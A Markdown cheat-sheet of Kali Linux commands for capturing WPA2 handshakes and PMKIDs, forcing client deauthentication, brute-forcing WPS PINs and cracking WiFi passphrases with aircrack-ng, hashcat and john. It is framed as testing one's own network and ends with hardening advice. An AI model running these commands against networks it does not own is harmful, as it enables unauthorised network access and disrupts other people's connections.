# Kali WiFi toolkit — common commands (handshake capture & cracking)

A cheat-sheet of the **standard Kali tools** that this kit's scripts wrap. Use
these when you want to drive the raw tools directly. Placeholders: `<IFACE>` the
monitor interface (your Alfa, usually `wlan1`), `<BSSID>` your AP's MAC, `<CH>`
its channel, `<CLIENT>` a client MAC on your AP.

> **Your own network only.** Capturing/cracking/deauthing networks you don't own
> is a crime. Each offensive step below exists so you can then *harden* your own
> setup (strong passphrase, no WPS, WPA3/PMF).

---

## 0. Adapter & monitor mode

```bash
iw dev                                  # list interfaces + their phy/type
iw list | grep -A8 "Supported interface modes"   # does it support monitor?
airmon-ng                               # list wireless adapters (as root)
sudo airmon-ng check kill               # stop NetworkManager/wpa_supplicant
sudo airmon-ng start <IFACE>            # -> monitor mode (may add 'mon' suffix)
sudo airmon-ng stop  <IFACE>            # back to managed

# manual monitor mode (no airmon):
sudo ip link set <IFACE> down
sudo iw dev <IFACE> set type monitor
sudo ip link set <IFACE> up

rfkill list ; sudo rfkill unblock all   # clear soft/hard blocks
sudo macchanger -r <IFACE>              # randomize MAC (down the iface first)
sudo iw dev <IFACE> set channel <CH>    # lock a channel
```

## 1. Scan / recon

```bash
sudo airodump-ng <IFACE>                       # live: all APs + clients
sudo airodump-ng --band abg <IFACE>            # include 5 GHz
sudo airodump-ng --bssid <BSSID> -c <CH> <IFACE>   # focus one AP
sudo wash -i <IFACE>                           # list WPS-enabled APs
sudo kismet -c <IFACE>                         # full-featured GUI/web recon
```

## 2. Capture the WPA2 4-way handshake (aircrack-ng)

```bash
# 1) lock onto your AP and write a capture:
sudo airodump-ng --bssid <BSSID> -c <CH> -w mynet <IFACE>

# 2) in a 2nd terminal, GENTLY deauth a client to force a reconnect
#    (small burst; too many prevents the handshake completing):
sudo aireplay-ng --deauth 1 -a <BSSID> -c <CLIENT> <IFACE>

# watch airodump's top-right for:  WPA handshake: <BSSID>
# verify the capture actually has one:
aircrack-ng mynet-01.cap
cowpatty -r mynet-01.cap -c            # alternate handshake check
```

## 3. Clientless PMKID (hcxdumptool / hcxtools)

hcxdumptool **7.x** changed its CLI (no more `--filterlist_ap`/`--filtermode`)
and it **arms the radio itself** — give it a *managed* interface, not an
airmon monitor one. (It does **not** support the Realtek `88XXau` driver.)

```bash
# restrict to your AP with a compiled BPF, then capture:
hcxdumptool --bpfc="wlan addr3 <BSSID>" > /tmp/ap.bpf
sudo hcxdumptool -i <IFACE> -w pmkid.pcapng -c <CH> --bpf=/tmp/ap.bpf --rds=1

# convert either capture to hashcat mode 22000:
hcxpcapngtool -o mynet.hc22000 mynet-01.cap        # from 4-way .cap
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng        # from PMKID capture
```

## 4. WPS attacks (then DISABLE WPS)

```bash
sudo wash -i <IFACE>                                   # find WPS APs
sudo reaver -i <IFACE> -b <BSSID> -c <CH> -vv          # WPS PIN brute
sudo reaver -i <IFACE> -b <BSSID> -c <CH> -K 1         # Pixie-Dust (fast)
sudo bully  -b <BSSID> -c <CH> <IFACE>                 # alternative
```
Lesson: if this works, **turn WPS off** on your router — it's a separate weakness.

## 5. All-in-one (wifite)

```bash
sudo wifite -i <IFACE>                 # interactive: scan, capture, PMKID, WPS
sudo wifite -i <IFACE> --bssid <BSSID> # target only your AP
```

## 6. Crack (offline)

```bash
# aircrack-ng (CPU) — dictionary:
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> mynet-01.cap

# hashcat mode 22000 (GPU) — dictionary:
hashcat -m 22000 mynet.hc22000 rockyou.txt -w 3
# pure brute force (all 8-digit numbers):
hashcat -m 22000 mynet.hc22000 -a 3 ?d?d?d?d?d?d?d?d
# hybrid: word + digits / digits + word:
hashcat -m 22000 mynet.hc22000 rockyou.txt -a 6 ?d?d?d?d
hashcat -m 22000 mynet.hc22000 -a 7 ?d?d?d?d rockyou.txt
# rules (mutations):
hashcat -m 22000 mynet.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# show a cracked result / check devices:
hashcat -m 22000 mynet.hc22000 --show
hashcat -I

# john the ripper (alternative):
hcxpcapngtool -o mynet.hc22000 mynet-01.cap
john --format=wpapsk-opencl --wordlist=rockyou.txt mynet.hc22000
```

Mask charsets: `?d` digit · `?l` lower · `?u` upper · `?s` symbol · `?a` all.
Wordlists on Kali: `/usr/share/wordlists/` (gunzip `rockyou.txt.gz`),
`sudo apt install seclists` → `/usr/share/seclists/Passwords/`.

## 7. Inspect a capture

```bash
tshark -r mynet-01.cap -Y eapol                        # list EAPOL frames
tshark -r mynet-01.cap -Y "wlan.rsn.capabilities.mfpr" # PMF required? (blocks deauth)
wpaclean clean.cap mynet-01.cap                        # strip to just the handshake
```

## Gotchas we actually hit

- **Pi 5 USB power cap** starves the Alfa → injection fails, adapter drops
  (`error -71`). Fix: `usb_max_current_enable=1` in `/boot/firmware/config.txt`
  (official 27W PSU) + reboot, or a powered USB hub.
- **hcxdumptool 7.x ≠ Realtek 88XXau** — "failed to arm interface." Use the
  aircrack-ng 4-way path instead, or an mt76/ath9k_htc adapter for PMKID.
- **PMF (802.11w) blocks deauth** — check with the tshark line above. If
  `mfpr=1`, deauth won't disconnect clients; capture passively or use PMKID.
- **Monitor iface naming** — airmon may keep `wlan1` or make `wlan1mon`; check
  `iw dev` for the actual name.
- **Over-deauth prevents the handshake** — send *one* burst, wait ~30s, repeat.

## Hardening (the point)

Strong random passphrase (4–5 words / 16+ mixed chars) → no wordlist, hybrid,
rule, or mask reaches it. **Disable WPS.** Enable **WPA3/PMF** (also blocks the
deauth capture). Delete real captures when done.
```bash
rm -f *.cap *.pcapng *.hc22000
```
